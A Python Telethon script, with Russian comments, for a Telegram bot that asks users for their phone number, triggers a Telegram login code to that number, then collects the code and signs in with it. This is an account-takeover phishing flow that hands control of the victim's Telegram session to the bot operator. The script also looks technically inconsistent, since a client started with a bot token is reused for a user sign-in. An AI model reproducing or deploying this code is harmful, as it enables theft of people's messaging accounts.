import asyncio
from telethon import TelegramClient, events

# Ваши данные API, которые вы получили на my.telegram.org
api_id = 'YOUR_API_ID'
api_hash = 'YOUR_API_HASH'
bot_token = 'YOUR_BOT_TOKEN'

# Создаем клиента и подключаемся к боту
client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# Словарь для хранения состояния пользователя
user_state = {}

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond('Добро пожаловать! Пожалуйста, введите ваш номер телефона в международном формате.')
    user_state[event.sender_id] = {}

@client.on(events.NewMessage)
async def handle_message(event):
    user_id = event.sender_id
    text = event.message.message

    if user_id not in user_state:
        await event.respond('Пожалуйста, введите /start для начала.')
        return

    state = user_state[user_id]

    # Если номер телефона не введен
    if 'phone_number' not in state:
        if text.startswith('+'):
            state['phone_number'] = text
            try:
                phone_code_hash = await client.send_code_request(text)
                state['phone_code_hash'] = phone_code_hash.phone_code_hash
                await event.respond('Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.')
            except Exception as e:
                await event.respond(f'Произошла ошибка: {e}')
        else:
            await event.respond('Пожалуйста, введите ваш номер телефона в международном формате.')
        return

    # Если номер телефона введен, но не введен код подтверждения
    if 'phone_code_hash' in state and 'code' not in state:
        try:
            phone_number = state['phone_number']
            phone_code_hash = state['phone_code_hash']
            await client.sign_in(phone_number, text, phone_code_hash=phone_code_hash)
            state['code'] = text
            await event.respond('Успешная авторизация!')
        except Exception as e:
            await event.respond(f'Произошла ошибка: {e}')
        finally:
            user_state.pop(user_id, None)
        return

async def main():
    async with client:
        print("Бот запущен...")
        await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
